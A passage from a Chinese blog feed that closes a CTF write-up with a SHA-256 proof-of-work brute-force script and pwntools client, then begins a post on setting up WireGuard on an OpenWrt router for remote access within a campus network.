010000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000010000000100000000000000000010000000001000000000000000000000100000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000001000000000000000100000000000000000000000000000000000000000000000000000000100000100000000000000000000000000000000000000000001000000000000000000100000000000000000000100000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000100000000000000000101000000000000000000000000000000000000000000000000000000000010000000000000100000000000000000100000000000000000000000000000001000100000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001000000000000000100010010000010000000000000000000000000001000000000000000000000000000000010000000000000000000000000000100000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000100000011000000011000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000100000000000000000000000000100000100000000000000000000000000000000010000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000010000000000000000000000100000000000000100000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000100001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000100000000000000000000000010000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000100001000000010100000000000000000001000000000000100000000000000100000000000000000000100000000000000000000100000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000010000000000000000000100000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000100000000000000001001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000100000000000000000000000000000000000000000000000000000000000000000100000000000100000000000000000000000000000000010000000000000000000000000000000000000000000100000100000000000000000000100010000100000101000000000000000000000000000000000001000000000100000000000000000000000000000000000010000000000000000000000000100000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000100000000000000000000000000010000000000000000000000000000100110001000000100000000000000000000000000000000000000000000100100000000000000000000100000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000001000000000000000000000000000000100000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000010000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000001000000000000000000100010000000000100010000000000000000000000100000000000000000000000000000000001000000000000000010000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000100000000000000000000000000000000000000100000000000000000000000000000000000000000100000000000000000000000000000000000000000100000000000000000000000000000000000000000000000100000000000000001000000000000000000000000000001000000000000000000000000000000100000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000001100000000000000000000100000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000100000000000000110001100100000000000100000000000000000000000000000000000010000100000000000000000000100000000000000000000100000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000100000000000000000000001000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000<br></code></pre></td></tr></table></figure><p>01 字符串有了，<code>proof_of_work()</code> 用下面脚本爆就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><br>suffix = <span class="hljs-string">&quot;ASIBeo2zoqXwSevw&quot;</span><br>target_prefix = <span class="hljs-string">&quot;f7f0f44df6bdf6d99248e7881dec26031b0a27a7b7e2c12522f0e8607fb1f48b&quot;</span><br><br><span class="hljs-comment"># 尝试所有长度为4的ASCII可打印字符组合</span><br>charset = string.ascii_letters + string.digits<br><br><span class="hljs-keyword">for</span> prefix <span class="hljs-keyword">in</span> itertools.product(charset, repeat=<span class="hljs-number">4</span>):<br>    candidate = <span class="hljs-string">&#x27;&#x27;</span>.join(prefix) + suffix<br>    hash_val = hashlib.sha256(candidate.encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> hash_val.startswith(target_prefix):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Found match: <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;&#x27;</span>.join(prefix)&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;SHA256(&#x27;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;&#x27;</span>.join(prefix)&#125;</span><span class="hljs-subst">&#123;suffix&#125;</span>&#x27;) = <span class="hljs-subst">&#123;hash_val&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>最后前面的都对了，本地完全通过了，但因为 netcat 的输入长度限制，直接 nc 服务端没法把完整 data 传输过去，所以又折腾了一下。z221x 师傅给了个脚本，最后终于是成了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> re<br><br>flag=<span class="hljs-string">&quotquot;</span><br><span class="hljs-comment"># 连接到目标服务，这里假设服务在本地 1234 端口，你需要根据实际情况修改</span><br>conn = remote(<span class="hljs-string">&#x27;1.95.71.197&#x27;</span>, <span class="hljs-number">9999</span>)<br><br><span class="hljs-comment"># 接收服务的回显信息</span><br>echo = conn.recvline().decode()<br><br><span class="hljs-comment"># 使用正则表达式提取后缀和目标哈希值</span><br>pattern = <span class="hljs-string">r&#x27;sha256\(XXXX\+(\w+)\) == (\w+)&#x27;</span><br><span class="hljs-keyword">match</span> = re.search(pattern, echo)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">match</span>:<br>    log.error(<span class="hljs-string">&quot;Failed to extract suffix and target hash from the echo.&quot;</span>)<br>    conn.close()<br>    exit(<span class="hljs-number">1</span>)<br><br>suffix = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>target_prefix = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># 字符集，包含所有字母和数字</span><br>charset = string.ascii_letters + string.digits<br><br><span class="hljs-comment"># 尝试所有长度为 4 的 ASCII 可打印字符组合</span><br><span class="hljs-keyword">for</span> prefix <span class="hljs-keyword">in</span> itertools.product(charset, repeat=<span class="hljs-number">4</span>):<br>    candidate = <span class="hljs-string">&#x27;&#x27;</span>.join(prefix) + suffix<br>    hash_val = hashlib.sha256(candidate.encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> hash_val.startswith(target_prefix):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Found match: <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;&#x27;</span>.join(prefix)&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;SHA256(&#x27;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;&#x27;</span>.join(prefix)&#125;</span><span class="hljs-subst">&#123;suffix&#125;</span>&#x27;) = <span class="hljs-subst">&#123;hash_val&#125;</span>&quot;</span>)<br>        <span class="hljs-comment"># 将找到的前缀发送给服务</span><br>        conn.sendline(<span class="hljs-string">&#x27;&#x27;</span>.join(prefix).encode())<br><br>        <span class="hljs-comment"># 接收并检查 &quot;Right!&quot; 响应</span><br>        response = conn.recvline().decode().strip()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Right!&quot;</span> <span class="hljs-keyword">in</span> response:<br>            <span class="hljs-built_in">print</span>(response)<br>            <span class="hljs-comment"># 接收并处理 &quot;give me your data:&quot; 提示</span><br><span class="hljs-comment">#             data_prompt = conn.recvline().decode().strip()</span><br><span class="hljs-comment">#             print(data_prompt)</span><br><span class="hljs-comment">#             # 这里可以根据需求发送数据，假设发送 &quot;test_data&quot;</span><br>            conn.sendline(flag)<br>            <span class="hljs-comment"># 接收并打印服务的最终响应</span><br>            final_response = conn.recvall().decode()<br>            <span class="hljs-built_in">print</span>(final_response)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] No match found.&quot;</span>)<br><br><span class="hljs-comment"># 关闭连接</span><br>conn.close()<br></code></pre></td></tr></table></figure><h1 id="master-of-movie"><a href="#master-of-movie" class="headerlink" title="master of movie"></a>master of movie</h1><p>根据片段截图找对应的影片的 IMDB 号，痛并快乐着（并非快乐</p><p>大伙一起狂找，可惜的是因为答案检测程序错误之类的导致我们痛失血分</p><p>misc 题的图片检索要百度、谷歌两个搜索引擎都去试试，此外还有小红书等等能根据图片搜索的都不要放过。</p><h1 id="可供参考学习的-WP"><a href="#可供参考学习的-WP" class="headerlink" title="可供参考学习的 WP"></a>可供参考学习的 WP</h1><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&mid=2247487421&idx=1&sn=ed4bac0ccc875fb6eca3a70225d8d9fd&chksm=ceca926109a3e9ec14ff9a17755af60b025442d576c501391907fd9fcf3e7e5ea35755da1783&mpshare=1&scene=23&srcid=0428kKjnTIimO6XRILncnTW6&sharer_shareinfo=b4dcd54a0c1ee949a798df6ea093020b&sharer_shareinfo_first=b4dcd54a0c1ee949a798df6ea093020b#rd">https://mp.weixin.qq.com/s?__biz&#x3D;Mzg4MTg1MDY4MQ&#x3D;&#x3D;&amp;mid&#x3D;2247487421&amp;idx&#x3D;1&amp;sn&#x3D;ed4bac0ccc875fb6eca3a70225d8d9fd&amp;chksm&#x3D;ceca926109a3e9ec14ff9a17755af60b025442d576c501391907fd9fcf3e7e5ea35755da1783&amp;mpshare&#x3D;1&amp;scene&#x3D;23&amp;srcid&#x3D;0428kKjnTIimO6XRILncnTW6&amp;sharer_shareinfo&#x3D;b4dcd54a0c1ee949a798df6ea093020b&amp;sharer_shareinfo_first&#x3D;b4dcd54a0c1ee949a798df6ea093020b#rd</a></p><p><a href="https://blog.xmcve.com/2025/04/27/ACTF2025-Writeup">https://blog.xmcve.com/2025/04/27/ACTF2025-Writeup</a></p><p>等</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>misc</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>校园网环境内的远程设备连接尝试</title>
    <link href="/2025/05/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/"/>
    <url>/2025/05/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="校园网环境内的远程设备连接尝试"><a href="#校园网环境内的远程设备连接尝试" class="headerlink" title="校园网环境内的远程设备连接尝试"></a>校园网环境内的远程设备连接尝试</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这两天在思考如何在寝室局域网之外远程连接寝室设备，以满足我有时候出门不方便带电脑想要用手机远程连接电脑操作的需求。我选定的是 sunshine+moonlight 串流方案，然而该方案本身并不支持远程连接，只适用于局域网连接，所以我需要通过内网穿透获取电脑网络服务或使用 VPN <del>构建虚拟局域网来</del>让我的电脑和手机设备处于同一个局域网环境内。</p><h1 id="openVPN"><a href="#openVPN" class="headerlink" title="openVPN"></a>openVPN</h1><p>由于 hdu 在去年进入了大内网时代（可恶(〃＞ 皿 ＜)），生活区的网络全部并入了校园网，由学校分配动态内网 ip。所以即便我手头有一个域名我也没法通过 DDNS 直接低成本方便地实现对寝室局域网的访问。</p><p>我手上刚好还有一个云服务器，之前作为护网的跳板机又刚好搭过 openVPN 的服务端，那么我想试着尝试通过 VPN 来让两个设备处于同一个<del>虚拟</del>局域网下。稍微修改配置文件，加上 client-to-client 允许客户端间通信，然后在两个设备上均使用 vpn 服务，成功连接！</p><p>然而效果一言难尽……</p><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/YV7HbvxIjoBLDrxIjBBcVP8knhh.jpg"></p><p>或许是服务器配的带宽太低、又是远程连接导致连接质量不好，总之放弃了这个方法，觉得还是满足校园网内的连接需求即可。</p><h1 id="WireGuard"><a href="#WireGuard" class="headerlink" title="WireGuard"></a>WireGuard</h1><p>都说 wireguard 是更加高性能、安全稳定的工具，那么趁这个机会就可以来试试用。在此之前我先捣鼓了一下路由器，将路由器刷成 openwrt 系统，参考之前的一篇文章<a href="https://5i1encee.github.io/2025/04/21/%E5%B0%8F%E7%B1%B3AX3000T%E5%88%B7%E6%9C%BAopenwrt%E5%B0%8F%E8%AE%B0/">小米 AX3000T 刷机 openwrt 小记</a>，一般来说 openwrt 自带 wireguard，且基本通过图形化界面操作配置即可，我将路由器作为服务端点，手机等移动设备作为对端节点来实现我的目标。</p><div class="note note-warning">            <p><strong>注意：</strong>以下 openwrt 上的配置操作均要记得<strong>保存并应用</strong></p>          </div><h2 id="创建密钥对"><a href="#创建密钥对" class="headerlink" title="创建密钥对"></a>创建密钥对</h2><p>ssh 连接路由器 <code>ssh root@192.168.1.1</code></p><p>使用如下命令分别生成两组密钥对</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#生成服务端公钥和私钥</span><br>wg genkey | <span class="hljs-built_in">tee</span> server_privatekey | wg pubkey &gt; server_publickey<br><span class="hljs-comment">#生成对端节点公钥和私钥</span><br>wg genkey | <span class="hljs-built_in">tee</span> client_privatekey | wg pubkey &gt; client_publickey<br><span class="hljs-comment">#cat一个个查看即可</span><br><span class="hljs-built_in">cat</span> server_privatekey<br></code></pre></td></tr></table></figure><p>生成共享密钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wg genpsk &gt; sharekey<br><span class="hljs-built_in">cat</span> sharekey<br></code></pre></td></tr></table></figure><p>这些密钥对可在路由器上清除传输至主机保存。如果需要多个对端节点就要生成多对密钥对，不能重复使用，共享密钥则所有均使用同一个。</p><h2 id="创建并配置接口"><a href="#创建并配置接口" class="headerlink" title="创建并配置接口"></a>创建并配置接口</h2><p>先创建新的接口，协议选择 WireGuard VPN</p><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/YDNUbzr9MoopWDx4cApc7CpxnCh.png"></p><p>然后配置该接口的各个关键配置</p><ul><li>私钥：为路由器准备的私钥</li><li>监听端口：路由器上将给 WireGuard 使用的端口</li><li>IP 地址：路由器在<del>虚拟局域网</del> VPN 内的 ip，必须为 IP-CIDR 格式</li></ul><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/EpObbJ3o6oRyqhxQnkqcNl21nPg.png"></p><p>下方“更多选项”处可选择“预共享密钥”进一步提高安全性</p><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/KP3AbYBiNoAPavxs06TclqETnu2.png"></p><p>添加 Peer 并配置以下内容</p><ul><li>公钥：为 Peer 准备的公钥</li><li>预共享密钥（可选）：之前生成的</li><li>允许的 ip：允许该 Peer 在<del>虚拟局域网</del> VPN 内使用的 ip，必须为 IP-CIDR 格式（我此处与上面路由器在<del>虚拟局域网</del> VPN 内的 ip 处于同一网段。不要输入路由器自身局域网的网段，如我这的 192.168.1.0&#x2F;24 就会出现逻辑错误）</li><li>路由允许的 IP：勾选即可访问路由器上的其他网段，如此我们才能从 Peer 访问到路由器本身下的局域网</li><li>端点主机：我的 Peer 即手机或其他移动设备，没有固定域名什么的，用不上</li><li>端点端口：有需要就设置，我默认即可</li><li>持续 Keep-Alive：默认情况下，WireGuard 在不使用时会尽可能保持静默，一般而言没有问题，但当对端处于 Nat 或防火墙后时长时间的静默可能导致映射失效，所以可以设置每隔一段时间向服务端点发送保持活动状态的数据包来保持连接状态。校园网里有些时候会遇到处于 Nat 下的情况，所以保险起见设一下。</li></ul><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/BFvbbKJfoon2qtxOhSHcZj8Knoj.png"></p><p>将以上均保存并应用后接口配置也就完成了。如果有多个对端节点设备则要配置多个 Peer，不能共同使用，会造成 IP 冲突等问题。</p><div class="note note-warning">            <p><strong>注意：</strong>WireGuard 的配置修改后是需要重启才能生效得，所以修改后还需记得点击 <code>连接</code> 重新启动一下</p>          </div><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/HNoCbSKF6o7rsExbiaqc1lcinzX.png"></p><h2 id="配置防火墙"><a href="#配置防火墙" class="headerlink" title="配置防火墙"></a>配置防火墙</h2><p>接下来为 WireGuard 专门配置一个防火墙规则。</p><p>先打开防火墙的通信规则</p><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/R3xbbhquIolf7Dx3ZLAcRh1lnYF.png"></p><p>在下方“打开路由器端口”处新增规则，允许 <code>TCP+UDP</code> 协议（moonlight+sunshine 两个协议都要用）并指定对外开放的端口（与之前 WireGuard 监听端口配置一致），只有路由器这个对外端口开放后 WireGuard 服务端点才能与外界建立连接。</p><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/CRE3bPL8coxciPxU5rdc7Z5Ance.png"></p><p>而后点击修改进行详细配置。源区域选择 <code>wan</code> 口防火墙，目标区域选择 <code>设备（输入）</code>，其他按需设置</p><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/EAB8bJd43oCMPHx0pmdcRobYnod.png"></p><p>保存并应用后去到防火墙的常规设置，下方点击添加，为 WireGuard 专门配置一个防火墙规则。转发要选择接受，覆盖网络选择之前配好的 WireGuard 接口，这样这个防火墙规则就应用到那个接口上去了。允许转发目标区域选择 <code>lan</code> 口防火墙和 <code>wan</code> 口防火墙，允许转发源区域选择 <code>lan</code> 口防火墙，这样一来来自 WireGuard 的流量就可以去往 wan 口向外界设备传输，去往 lan 口向寝室局域网设备传输，来自寝室局域网设备的 lan 口流量就可以去往 WireGuard 向对端节点设备传输。</p><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/VrANbcKbQopBXJxwno2capQVnrc.png"></p><p>最后保存并应用完成防火墙配置</p><h2 id="对端-WireGuard-配置"><a href="#对端-WireGuard-配置" class="headerlink" title="对端 WireGuard 配置"></a>对端 WireGuard 配置</h2><p>在对端（手机）下载 WireGuard，手动创建隧道</p><ul><li>本地私钥：为 Peer 准备的私钥</li><li>本地公钥：此处不必理会，填入上面的私钥后自动就出来了，跟之前路由器上生成的是一样的</li><li>局域网 IP 地址：本设备在<del>虚拟局域网</del> VPN 内的 IP，必须为 IP-CIDR 格式，要属于路由器上配置的 <code>允许的ip</code></li><li>DNS 服务器：随意设置即可，这个场景不太需要</li><li>远程公钥：为路由器准备的公钥</li><li>预共享密钥（可选）：之前生成的</li><li>连接保活间隔：自行选择</li><li>对端（相对于手机本机来说）：当前设备所处网络环境下能访问到的另一端的 ip，此处即校园网大内网环境下寝室路由器被 DHCP 分配到的内网 IP。（经过测试，当下 hdu 教学区的校园网与生活区的校园网基本相通，由于我只要求在校园网内使用，所以填写内网 IP 在连接校园 WiFi 的情况下使用即可）注意需带上前面设置的开放端口号，<code>ip:port</code></li><li>路由的 IP 地址（段）：另一端设备所处的网段，前面路由器设置的是 192.168.2.1（<del>虚拟局域网</del> VPN 内）和 192.168.1.1（本身局域网内），那么填入 192.168.2.1&#x2F;24 和 192.168.1.1&#x2F;24 也就是在访问这两个网段时将通过 WireGuard 的规则通信，将当前设备“并入”另一端设备（寝室路由器）的局域网络</li></ul><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/J71AbzyAXoEwCMxbP6dcYOsInFb.png"></p><p>配置完成后开启，在接口处点击连接并查看，若出现接收、发送流量那基本就全部配置成功了。</p><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/Pj1qbqnIwok5SMxwZCTc3ZTunjh.png"></p><h2 id="配置-moonlight"><a href="#配置-moonlight" class="headerlink" title="配置 moonlight"></a>配置 moonlight</h2><p>先局域网内跟电脑绑定一下 Pin 码，远程的时候打开 WireGuard 指定 192.168.1.6 的 ip 连接电脑即可</p><h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><h2 id="折腾？"><a href="#折腾？" class="headerlink" title="折腾？"></a>折腾？</h2><p>折腾，其实图方便的话直接用第三方软件向日葵或者 windows 远程桌面等就能实现需求，如果非要用 moonlight+sunshine 的话在 openwrt 上也有现成的傻瓜式组网工具 ZeroTier 等等可以用，更加方便可能效果也好。那么我这么折腾主要也就是为了多学习实践，再者 DN11 的佬们也使用了 WireGuard 进行组网，那么我就当是并入 DN11 网络前提前尝试一下。</p><h2 id="内网穿透、NAT、代理、隧道、VPN、虚拟局域网、端口映射、端口转发"><a href="#内网穿透、NAT、代理、隧道、VPN、虚拟局域网、端口映射、端口转发" class="headerlink" title="内网穿透、NAT、代理、隧道、VPN、虚拟局域网、端口映射、端口转发"></a>内网穿透、NAT、代理、隧道、VPN、虚拟局域网、端口映射、端口转发</h2><p>这一大堆概念曾经或许明白了，但过段时间又分不清了……这里简要记录一下现在的理解，不保证正确性和准确性……</p><h3 id="内网穿透与-NAT"><a href="#内网穿透与-NAT" class="headerlink" title="内网穿透与 NAT"></a>内网穿透与 NAT</h3><p>内网穿透即 NAT 穿透。</p><p>在 <strong>NAT</strong> 后的多台设备通过 NAT 的网络地址转换可以使用同一个外部 IP 进行对外访问。以本次尝试为例，在内部设备（192.168.1.6）发送请求后，请求的 IP 数据包为源 192.168.1.6 至目标 10.150.27.27（这个是随便写的校园内网 IP，但相对于寝室局域网来说是外网，替换成公网 IP 也一样理解），那么 NAT 就会将这个数据包的源 IP 改写为本局域网可用的外部 IP（假设路由器在校园内网中被分配到的 10.150.27.28），并留下一条内部 192.168.1.6 到外部 10.150.27.28 的映射记录，外部并不知道是 NAT 下具体是哪个 IP 发起的请求，将响应数据包返回给路由器后路由器的 NAT 就根据映射记录将响应转发给其下局域网内发起请求的 IP。可以看出来，这种情况下外部想要主动访问内部设备就变得困难了。</p><p>那么<strong>内网穿透</strong>解决的其实就是这个问题，通过让内部设备主动请求外部设备来让路由器 NAT 留下映射记录，然后外部设备才能向内部发送数据，通过已经建立通信的外部设备进行中转与内部通信，就是实现了内网穿透。</p><h3 id="代理与内网穿透"><a href="#代理与内网穿透" class="headerlink" title="代理与内网穿透"></a>代理与内网穿透</h3><p><strong>代理</strong>的概念最浅显易懂，就是让一个中间人（代理服务器）代为传递消息，分为正向代理和反向代理两种</p><p>正向可以起到隐藏访问者 IP、访问部分不可达外部网络（更准确通用地说应该是绕过访问限制）等作用。</p><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/HgiTbMkwaoHyRax0x6WcNcrHnNg.png"></p><p>反向代理则可用于访问控制、CDN 加速、负载均衡缓存优化、访问部分不可达内部网络（更准确通用地说应该是绕过访问限制）等等</p><p><img src="/img/%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E5%B0%9D%E8%AF%95/UQ5gbwAf3oJvysx9kxeceQrxnDg.png"></p><p>那么内网穿透与代理有什么关系呢？我觉得<strong>内网穿透</strong>的核心就是通过内部设备主动发出请求保持一条与外界持续连接通信的信道，但为了方便使用，这个设备最好作为中转的代理服务器（不需要自己直接使用的设备来维持连接）且有公网 IP（随处均可访问），所以就会与代理技术联系在一起，代理强调的是整体的网络通信逻辑结构，内网穿透强调的是外部设备访问内部设备的方式。例如 frp 就是使用反向代理。</p><h3 id="隧道、VPN-与代理"><a href="#隧道、VPN-与代理" class="headerlink" title="隧道、VPN 与代理"></a>隧道、VPN 与代理</h3><p><strong>隧道</strong>技术是在一个网络协议中封装另一个网络协议的数据包，使其能够在原本不支持的网络上进行传输。（应用层）</p><p>而 <strong>VPN</strong> 则是使用了隧道技术并加密用于构建私有安全通信的技术。</p><p>而<strong>代理</strong>如上所说强调的是中间人中转的通信逻辑，它的实现则可以使用 VPN 技术，如果不使用 VPN 仅使用代理服务器中转那么通信内容是并不隐蔽的，如果使用 VPN 进行代理那么 VPN 的加密隧道就可以确保从客户端到代理服务器的隐秘性。</p><h3 id="虚拟局域网与-VPN"><a href="#虚拟局域网与-VPN" class="headerlink" 